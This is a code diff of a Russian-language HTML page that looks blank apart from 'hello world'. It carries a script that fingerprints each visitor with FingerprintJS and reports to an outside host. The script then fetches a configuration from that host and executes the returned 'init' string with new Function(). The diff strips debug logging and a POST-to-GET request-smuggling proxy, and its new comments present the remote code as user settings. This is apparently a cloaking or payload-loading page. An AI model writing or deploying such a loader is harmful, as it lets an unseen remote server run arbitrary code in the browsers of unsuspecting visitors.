@@ -1,97 +1,40 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Белый конструктор</title>
 <script type="module">
 (async () => {
     try {
         const CONFIG_API = 'https://spiritguidetg.store/fp.php';
         
-        console.log('Starting FingerprintJS with POST bypass...');
-        
-        // Создаем прокси для fetch, чтобы перехватывать POST запросы
-        const originalFetch = window.fetch;
-        window.fetch = function(url, options = {}) {
-            // Проверяем, это POST запрос к нашему API?
-            if (options.method === 'POST' && url.includes(CONFIG_API)) {
-                console.log('Intercepting POST request:', url);
-                
-                // Извлекаем путь и query из URL
-                const urlObj = new URL(url);
-                const path = urlObj.pathname.replace('/fp.php/', '').replace('/fp.php', '');
-                const query = urlObj.search.substring(1); // убираем ?
-                
-                // Кодируем POST данные в base64
-                const postData = options.body || '';
-                const encodedData = btoa(postData);
-                
-                // Кодируем заголовки
-                const headers = {};
-                if (options.headers) {
-                    if (options.headers instanceof Headers) {
-                        for (let [key, value] of options.headers.entries()) {
-                            headers[key] = value;
-                        }
-                    } else {
-                        Object.assign(headers, options.headers);
-                    }
-                }
-                const encodedHeaders = btoa(JSON.stringify(headers));
-                
-                // Формируем GET URL с параметрами
-                const bypassUrl = new URL(CONFIG_API);
-                bypassUrl.searchParams.set('post_proxy', '1');
-                bypassUrl.searchParams.set('path', path);
-                bypassUrl.searchParams.set('query', query);
-                bypassUrl.searchParams.set('data', encodedData);
-                bypassUrl.searchParams.set('headers', encodedHeaders);
-                
-                console.log('Converted POST to GET:', bypassUrl.toString());
-                
-                // Выполняем GET запрос вместо POST
-                return originalFetch(bypassUrl.toString(), {
-                    method: 'GET',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                });
-            }
-            
-            // Для всех остальных запросов используем оригинальный fetch
-            return originalFetch(url, options);
-        };
-        
-        // Теперь загружаем FingerprintJS как обычно
+        // Динамический импорт вместо статического
         const FingerprintJS = await import('/clk/fp.js');
-        console.log('FingerprintJS loaded successfully');
         
         const fp = await FingerprintJS.load({
             region: 'eu',
             endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
         });
-        console.log('FingerprintJS initialized');
 
         const { requestId } = await fp.get({ extendedResult: true });
-        console.log('Request ID received:', requestId);
 
-        // Загрузка конфигурации
-        const url = `${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`;
-        console.log('Fetching config from:', url);
-        
-        const res = await originalFetch(url); // Используем оригинальный fetch для конфига
-        console.log('Response status:', res.status);
-        
-        if (!res.ok) {
-            console.error('Response not OK:', res.status, res.statusText);
-            return;
-        }
+        // Загрузка конфигурации интерфейса
+        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`);
+        if (!res.ok) return;
 
         const data = await res.json();
-        console.log('Response data:', data);
 
+        // Выполнение пользовательских настроек
         if (data.init) {
-            console.log('Executing init script...');
             new Function(data.init)();
         }
     } catch (err) {
-        console.error('Detailed error:', err);
-        console.error('Error stack:', err.stack);
+        console.error('Ошибка загрузки FingerprintJS:', err);
     }
 })();
 </script>
+</head>
+<body>
+  hello world
+</body>
+</html>
